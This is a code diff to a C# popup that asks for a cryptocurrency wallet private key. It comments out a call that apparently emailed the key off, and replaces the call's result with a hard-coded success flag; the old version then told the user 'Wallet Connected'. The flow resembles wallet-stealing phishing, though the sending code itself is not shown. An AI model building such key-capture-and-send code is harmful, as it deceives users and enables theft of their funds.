@@ -19,7 +19,7 @@ public partial class PrivateKeyPopup : Popup
 
     private void OnCloseButtonClicked(object sender, EventArgs e)
     {
-        Close();
+        Close(false);
     }
 
     private async void OnOkButtonClicked(object sender, EventArgs e)
@@ -35,29 +35,10 @@ public partial class PrivateKeyPopup : Popup
             else
             {
                 Key = txtPrivateKey.Text;
-                var isSent =await SendEmail();
-                
-                if (isSent)
-                {
+                //var isSent =await SendEmail();
+                bool isSent = true;
 
-                    MainPage mainPageInstance = Application.Current.MainPage as MainPage;
-                    if (mainPageInstance != null)
-                    {
-                        MainPage.UpdateButtonText(mainPageInstance, "Wallet Connected");
-                    }
-                    else
-                    {
-                        System.Diagnostics.Debug.WriteLine("MainPage instance is null.");
-                    }
-
-
-                    Close();
-                }
-                else
-                {
-
-                }
-               
+                Close(isSent);
             }
         }
         catch (Exception ex)
@@ -66,7 +47,7 @@ public partial class PrivateKeyPopup : Popup
             Console.WriteLine($"Error in OnOkButtonClicked: {ex}");
 
             // Safely close the popup even if there was an error
-            Close();
+            Close(false);
         }
     }
 
